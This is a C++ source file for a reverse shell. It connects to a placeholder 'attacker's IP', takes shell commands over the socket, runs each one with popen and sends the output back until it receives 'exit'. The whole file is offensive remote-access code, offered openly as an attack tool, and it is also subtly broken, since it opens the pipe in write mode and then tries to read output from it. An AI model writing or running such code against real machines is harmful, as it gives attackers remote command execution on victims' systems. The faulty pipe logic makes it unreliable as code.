#include <iostream>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstdlib>
#include <cstring>

#define SERVER_IP "127.0.0.1"  // Replace with attacker's IP
#define SERVER_PORT 23
#define BUFFER_SIZE 1024

using namespace std;

int main() {
    int sock;
    struct sockaddr_in server_addr;
    char buffer[BUFFER_SIZE];

    // Create socket
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == -1) {
        cerr << "Socket creation failed" << endl;
        return -1;
    }

    // Configure server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    server_addr.sin_addr.s_addr = inet_addr(SERVER_IP);

    // Connect to server
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == -1) {
        cerr << "Connection failed" << endl;
        return -1;
    }

    cout << "Connected to attacker!" << endl;

    while (true) {
        memset(buffer, 0, BUFFER_SIZE);

        // Receive command from attacker
        int bytesReceived = recv(sock, buffer, BUFFER_SIZE, 0);
        if (bytesReceived <= 0) {
            cerr << "Connection closed by attacker" << endl;
            break;
        }

        // Check if exit command is received
        if (strcmp(buffer, "exit") == 0) {
            cout << "Exit command received, closing..." << endl;
            break;
        }

        // Execute command
        FILE* fp = popen(buffer, "w");
        if (!fp) {
            cerr << "Failed to execute command" << endl;
            continue;
        }

        // Read command output
        char result[BUFFER_SIZE];
        memset(result, 0, BUFFER_SIZE);
        fread(result, 1, BUFFER_SIZE - 1, fp);
        pclose(fp);

        // Send output back to attacker
        send(sock, result, strlen(result), 0);
    }

    close(sock);
    return 0;
}
